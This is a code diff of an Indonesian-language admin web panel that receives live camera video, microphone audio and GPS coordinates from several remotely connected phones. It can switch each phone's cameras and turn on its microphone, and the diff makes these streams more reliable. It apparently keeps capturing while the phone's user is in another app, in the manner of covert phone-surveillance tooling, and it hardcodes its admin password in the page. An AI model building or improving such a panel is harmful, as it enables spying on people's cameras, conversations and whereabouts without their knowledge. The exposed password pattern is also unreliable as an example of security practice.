@@ -9,57 +9,36 @@
     * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Inter', 'Segoe UI', sans-serif; }
     body { background: #0B1120; color: #F8FAFC; min-height: 100vh; padding: 18px; }
 
-    /* Lock Screen */
     .lock-screen {
-      position: fixed;
-      inset: 0;
-      z-index: 999;
+      position: fixed; inset: 0; z-index: 999;
       background: radial-gradient(circle at top, #172554 0%, #0B1120 65%);
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      padding: 20px;
+      display: flex; align-items: center; justify-content: center; padding: 20px;
     }
     .lock-screen.hidden { display: none; }
     .lock-card {
-      width: 100%;
-      max-width: 370px;
-      background: #111827;
-      border: 1px solid #1F2937;
-      border-radius: 16px;
-      padding: 24px;
-      box-shadow: 0 20px 50px rgba(0, 0, 0, 0.5);
+      width: 100%; max-width: 370px; background: #111827; border: 1px solid #1F2937;
+      border-radius: 16px; padding: 24px; box-shadow: 0 20px 50px rgba(0, 0, 0, 0.5);
     }
     .lock-card h2 { font-size: 18px; font-weight: 700; margin-bottom: 6px; }
     .lock-card p { font-size: 12px; color: #94A3B8; margin-bottom: 16px; line-height: 1.45; }
     .lock-input {
-      width: 100%;
-      background: #020617;
-      border: 1px solid #334155;
-      color: #F8FAFC;
-      border-radius: 8px;
-      padding: 10px 12px;
-      font-size: 13px;
-      outline: none;
-      margin-bottom: 10px;
+      width: 100%; background: #020617; border: 1px solid #334155; color: #F8FAFC;
+      border-radius: 8px; padding: 10px 12px; font-size: 13px; outline: none; margin-bottom: 10px;
     }
-    .lock-input:focus { border-color: #118EE9; }
     .lock-btn { width: 100%; padding: 10px 14px; font-size: 13px; }
     .lock-error { color: #F87171; font-size: 11px; min-height: 16px; margin-bottom: 8px; }
 
     .container { max-width: 1380px; margin: 0 auto; }
     .topbar {
       display: flex; justify-content: space-between; align-items: center;
-      flex-wrap: wrap; gap: 12px; padding-bottom: 16px; margin-bottom: 18px;
-      border-bottom: 1px solid #1E293B;
+      flex-wrap: wrap; gap: 12px; padding-bottom: 16px; margin-bottom: 18px; border-bottom: 1px solid #1E293B;
     }
     .topbar h1 { font-size: 20px; font-weight: 700; }
     .sub { font-size: 12px; color: #94A3B8; margin-top: 4px; }
     .controls { display: flex; gap: 8px; flex-wrap: wrap; align-items: center; }
     button {
       border: none; border-radius: 8px; padding: 9px 13px;
-      font-size: 12px; font-weight: 600; cursor: pointer; color: #FFFFFF;
-      transition: background 0.15s ease;
+      font-size: 12px; font-weight: 600; cursor: pointer; color: #FFFFFF; transition: background 0.15s ease;
     }
     .btn-blue { background: #118EE9; }
     .btn-blue:hover { background: #0D7CD0; }
@@ -75,77 +54,26 @@
     .btn-red:hover { background: #B91C1C; }
     .btn-sm { padding: 6px 10px; font-size: 11px; border-radius: 6px; }
 
-    .grid-devices {
-      display: grid;
-      grid-template-columns: repeat(auto-fill, minmax(310px, 1fr));
-      gap: 14px;
-    }
-    .device-card {
-      background: #111827;
-      border: 1px solid #1F2937;
-      border-radius: 14px;
-      overflow: hidden;
-      display: flex;
-      flex-direction: column;
-    }
+    .grid-devices { display: grid; grid-template-columns: repeat(auto-fill, minmax(310px, 1fr)); gap: 14px; }
+    .device-card { background: #111827; border: 1px solid #1F2937; border-radius: 14px; overflow: hidden; display: flex; flex-direction: column; }
     .video-wrap {
-      position: relative;
-      width: 100%;
-      aspect-ratio: 4 / 3;
-      background: #020617;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      overflow: hidden;
+      position: relative; width: 100%; aspect-ratio: 4 / 3; background: #020617;
+      display: flex; align-items: center; justify-content: center; overflow: hidden;
     }
-    .video-wrap video {
-      width: 100%;
-      height: 100%;
-      object-fit: cover;
-      transform: translateZ(0);
-      backface-visibility: hidden;
-      will-change: transform;
-    }
-    .video-placeholder {
-      position: relative;
-      z-index: 2;
-      font-size: 12px;
-      color: #64748B;
-      text-align: center;
-      padding: 12px;
-    }
-    .chip-row {
-      position: absolute;
-      top: 8px; left: 8px; right: 8px;
-      z-index: 3;
-      display: flex; justify-content: space-between; gap: 6px;
-      pointer-events: none;
-    }
-    .chip {
-      background: rgba(15, 23, 42, 0.85);
-      border: 1px solid rgba(148, 163, 184, 0.25);
-      color: #F8FAFC;
-      font-size: 10px;
-      font-weight: 700;
-      padding: 3px 8px;
-      border-radius: 999px;
-    }
+    .video-wrap video { width: 100%; height: 100%; object-fit: cover; transform: translateZ(0); }
+    .video-placeholder { position: relative; z-index: 2; font-size: 12px; color: #64748B; text-align: center; padding: 12px; }
+    .chip-row { position: absolute; top: 8px; left: 8px; right: 8px; z-index: 3; display: flex; justify-content: space-between; gap: 6px; pointer-events: none; }
+    .chip { background: rgba(15, 23, 42, 0.85); border: 1px solid rgba(148, 163, 184, 0.25); color: #F8FAFC; font-size: 10px; font-weight: 700; padding: 3px 8px; border-radius: 999px; }
     .chip.live { background: rgba(22, 163, 74, 0.92); border-color: transparent; }
     .chip.bg { background: rgba(217, 119, 6, 0.92); border-color: transparent; }
     .chip.off { background: rgba(185, 28, 28, 0.92); border-color: transparent; }
 
-    .card-body { padding: 12px; display: flex; flex-direction: column; gap: 8px; font-size: 12px; }
+    .card-body { padding: 12px; display: flex; flex-direction: column; gap: 7px; font-size: 12px; }
     .device-id { font-weight: 700; color: #E2E8F0; font-size: 13px; }
     .meta-line { color: #94A3B8; font-size: 11px; line-height: 1.4; }
     .card-actions { display: flex; gap: 6px; flex-wrap: wrap; margin-top: 4px; }
-    .map-link {
-      color: #38BDF8; font-size: 11px; font-weight: 600;
-      text-decoration: none; margin-left: auto; align-self: center;
-    }
-    .empty-box {
-      background: #111827; border: 1px solid #1F2937; border-radius: 14px;
-      padding: 36px 20px; text-align: center; color: #64748B; font-size: 13px;
-    }
+    .map-link { color: #38BDF8; font-size: 11px; font-weight: 600; text-decoration: none; margin-left: auto; align-self: center; }
+    .empty-box { background: #111827; border: 1px solid #1F2937; border-radius: 14px; padding: 36px 20px; text-align: center; color: #64748B; font-size: 13px; }
   </style>
 </head>
 <body>
@@ -153,14 +81,7 @@
     <form class="lock-card" onsubmit="handleUnlock(event)">
       <h2>Akses Panel Admin</h2>
       <p>Masukkan password untuk membuka dashboard pantau kamera, suara & lokasi multi-HP.</p>
-      <input
-        id="passwordInput"
-        class="lock-input"
-        type="password"
-        placeholder="Masukkan password..."
-        autocomplete="current-password"
-        required
-      />
+      <input id="passwordInput" class="lock-input" type="password" placeholder="Masukkan password..." autocomplete="current-password" required />
       <div id="lockError" class="lock-error"></div>
       <button type="submit" class="btn-blue lock-btn">Masuk Panel</button>
     </form>
@@ -179,8 +100,6 @@
         <button class="btn-emerald" onclick="requestMicAllDevices()">🎙️ Aktifkan Mic Semua</button>
         <button class="btn-amber" onclick="muteAllAudio(false)">🔊 Unmute Semua</button>
         <button class="btn-slate" onclick="muteAllAudio(true)">🔇 Mute Semua</button>
-        <button class="btn-slate" onclick="setAllQuality('hd')">✨ HD</button>
-        <button class="btn-slate" onclick="setAllQuality('smooth')">⚡ Smooth</button>
         <button class="btn-slate" onclick="pingAllDevices()">🔄 Refresh</button>
         <button class="btn-red" onclick="lockPanel()">🔒 Kunci</button>
       </div>
@@ -198,6 +117,17 @@
     const ADMIN_PASSWORD = "JirunSnd27-";
     const AUTH_STORAGE_KEY = "jirun_admin_unlocked_v1";
     const BACKGROUND_GRACE_MS = 30000;
+
+    const PEER_CONFIG = {
+      config: {
+        iceServers: [
+          { urls: "stun:stun.l.google.com:19302" },
+          { urls: "stun:stun1.l.google.com:19302" },
+          { urls: "stun:stun2.l.google.com:19302" },
+          { urls: "stun:global.stun.twilio.com:3478" }
+        ]
+      }
+    };
 
     let peer = null;
     const devices = {};
@@ -244,7 +174,7 @@
     function initAdminPeer() {
       if (!isUnlocked() || peer) return;
       document.getElementById("lobbyStatus").textContent = "Menghubungkan ke Lobby Admin...";
-      peer = new Peer(ADMIN_LOBBY_ID);
+      peer = new Peer(ADMIN_LOBBY_ID, PEER_CONFIG);
 
       peer.on("open", () => {
         document.getElementById("lobbyStatus").textContent = `Lobby Aktif (${ADMIN_LOBBY_ID}) • Menunggu HP terhubung`;
@@ -259,13 +189,17 @@
         entry.updatedAt = Date.now();
         syncDeviceCard(id);
 
-        conn.on("open", () => {
-          conn.send({ type: "REQUEST_STREAM", quality: entry.quality || "hd", enableMic: true });
-        });
+        const triggerRequest = () => {
+          if (conn.open) {
+            conn.send({ type: "REQUEST_STREAM", enableMic: true });
+          }
+        };
+
+        if (conn.open) triggerRequest();
+        conn.on("open", triggerRequest);
 
         conn.on("data", (msg) => {
           if (!msg) return;
-
           if (msg.type === "HP_CLOSING") {
             entry.closedExplicitly = true;
             entry.connected = false;
@@ -286,8 +220,8 @@
             entry.connected = true;
             entry.updatedAt = Date.now();
 
-            if (!entry.call && peer && !peer.destroyed) {
-              requestStreamFromDevice(id);
+            if ((!entry.stream || !entry.stream.active) && conn.open) {
+              conn.send({ type: "REQUEST_STREAM", enableMic: true });
             }
             syncDeviceCard(id);
           }
@@ -338,7 +272,6 @@
           inBackground: false,
           location: null,
           device: "",
-          quality: "hd",
           updatedAt: Date.now(),
           connected: true,
           closedExplicitly: false,
@@ -354,7 +287,10 @@
       const entry = devices[id];
       if (!entry || !peer || peer.destroyed) return;
       if (entry.conn && entry.conn.open) {
-        entry.conn.send({ type: "REQUEST_STREAM", quality: entry.quality || "hd", enableMic });
+        entry.conn.send({ type: "REQUEST_STREAM", enableMic });
+      }
+      if (entry.stream) {
+        attachStreamToCard(id, entry.stream);
       }
     }
 
@@ -416,7 +352,7 @@
       const entry = devices[id];
       if (entry && entry.conn && entry.conn.open) {
         entry.facing = facing === "environment" ? "Belakang" : "Depan";
-        entry.conn.send({ type: "SWITCH_CAM", facing, quality: entry.quality || "hd", enableMic: true });
+        entry.conn.send({ type: "SWITCH_CAM", facing, enableMic: true });
         syncDeviceCard(id);
       }
     }
@@ -424,22 +360,6 @@
     function switchAllCameras(facing) {
       for (const id of Object.keys(devices)) {
         switchDeviceCamera(id, facing);
-      }
-    }
-
-    function setDeviceQuality(id, quality) {
-      const entry = devices[id];
-      if (!entry) return;
-      entry.quality = quality;
-      if (entry.conn && entry.conn.open) {
-        entry.conn.send({ type: "SET_QUALITY", quality });
-      }
-      syncDeviceCard(id);
-    }
-
-    function setAllQuality(quality) {
-      for (const id of Object.keys(devices)) {
-        setDeviceQuality(id, quality);
       }
     }
 
@@ -467,9 +387,7 @@
         vid.volume = shouldMute ? 0 : 1;
         vid.style.display = "block";
         ph.style.display = "none";
-        if (vid.paused) {
-          vid.play().catch(() => {});
-        }
+        vid.play().catch(() => {});
       } else if (!stream) {
         vid.srcObject = null;
         vid.style.display = "none";
@@ -493,7 +411,7 @@
         <div class="video-wrap">
           <div class="chip-row">
             <span class="chip" id="status_${safeId}">Menunggu</span>
-            <span class="chip" id="qchip_${safeId}">HD</span>
+            <span class="chip">${escapeHtml(d.peerId.slice(-6))}</span>
           </div>
           <video id="vid_${safeId}" autoplay playsinline muted style="display:none;"></video>
           <div id="ph_${safeId}" class="video-placeholder">
@@ -502,17 +420,15 @@
         </div>
         <div class="card-body">
           <div class="device-id">${safeId}</div>
-          <div class="meta-line" id="mic_${safeId}">🎙️ Mic: Mengecek...</div>
+          <div class="meta-line" id="streamDiag_${safeId}">🎥 Stream: Menunggu • 🎙️ Mic: Mengecek</div>
           <div class="meta-line" id="loc_${safeId}">📍 Menunggu koordinat akurat...</div>
           <div class="meta-line" id="dev_${safeId}">📱 Perangkat</div>
           <div class="card-actions" id="act_${safeId}">
             <button class="btn-indigo btn-sm" onclick="switchDeviceCamera('${safeId}', 'user')">Depan</button>
             <button class="btn-indigo btn-sm" onclick="switchDeviceCamera('${safeId}', 'environment')">Belakang</button>
-            <button class="btn-emerald btn-sm" id="btnMic_${safeId}" onclick="requestMicForDevice('${safeId}')">🎙️ Minta Mic</button>
+            <button class="btn-emerald btn-sm" onclick="requestMicForDevice('${safeId}')">🎙️ Minta Mic</button>
             <button class="btn-amber btn-sm" id="btnAudio_${safeId}" onclick="toggleDeviceAudioMute('${safeId}')">🔇 Unmute</button>
-            <button class="btn-slate btn-sm" onclick="setDeviceQuality('${safeId}', 'hd')">HD</button>
-            <button class="btn-slate btn-sm" onclick="setDeviceQuality('${safeId}', 'smooth')">Smooth</button>
-            <button class="btn-blue btn-sm" onclick="requestStreamFromDevice('${safeId}', true)">Stream</button>
+            <button class="btn-blue btn-sm" onclick="requestStreamFromDevice('${safeId}', true)">▶ Putar / Stream</button>
           </div>
         </div>
       `;
@@ -537,14 +453,10 @@
       const ageSec = Math.max(0, Math.round(ageMs / 1000));
       const withinGrace = !d.closedExplicitly && ageMs <= BACKGROUND_GRACE_MS;
       const hasLiveStream = Boolean(d.stream && d.stream.active);
+      const hasAudioTrack = Boolean(d.stream && d.stream.getAudioTracks().some((t) => t.readyState === "live"));
 
       const statusChip = document.getElementById(`status_${id}`);
-      const qChip = document.getElementById(`qchip_${id}`);
       const ph = document.getElementById(`ph_${id}`);
-
-      if (qChip) {
-        qChip.textContent = (d.quality === "smooth" ? "SMOOTH" : "HD") + " • " + d.peerId.slice(-4);
-      }
 
       if (!withinGrace) {
         if (d.stream) {
@@ -572,16 +484,17 @@
           statusChip.className = "chip bg";
         }
         if (ph && !hasLiveStream) {
-          ph.textContent = "Perangkat sedang buka aplikasi lain (menjaga koneksi)...";
+          ph.textContent = "Menghubungkan stream kamera & audio lintas jaringan...";
         }
       }
 
-      const micEl = document.getElementById(`mic_${id}`);
+      const diagEl = document.getElementById(`streamDiag_${id}`);
       const btnAudio = document.getElementById(`btnAudio_${id}`);
-      if (micEl) {
-        const micLabel = d.micOn ? "Mic HP Aktif" : "Mic HP Belum Aktif";
-        const listenLabel = d.audioMuted ? "Suara Admin: Mute" : "Suara Admin: Terdengar";
-        micEl.textContent = `🎙️ ${micLabel} • ${listenLabel}`;
+      if (diagEl) {
+        const vidState = hasLiveStream ? "Masuk" : "Belum Masuk";
+        const micState = (d.micOn || hasAudioTrack) ? "Aktif" : "Tidak Ada";
+        const speakerState = d.audioMuted ? "Muted" : "Unmuted";
+        diagEl.textContent = `🎥 Video: ${vidState} • 🎙️ Mic: ${micState} (${speakerState})`;
       }
       if (btnAudio) {
         btnAudio.textContent = d.audioMuted ? "🔇 Unmute" : "🔊 Mute";
@@ -593,7 +506,7 @@
       if (locEl) {
         locEl.textContent = hasCoords
           ? `📍 ${loc.lat}, ${loc.lng} (Akurasi ${loc.accuracy || "-"})`
-          : "📍 Menunggu koordinat akurat...";
+          : "📍 Menunggu koordinat GPS dari HP member...";
       }
 
       const devEl = document.getElementById(`dev_${id}`);
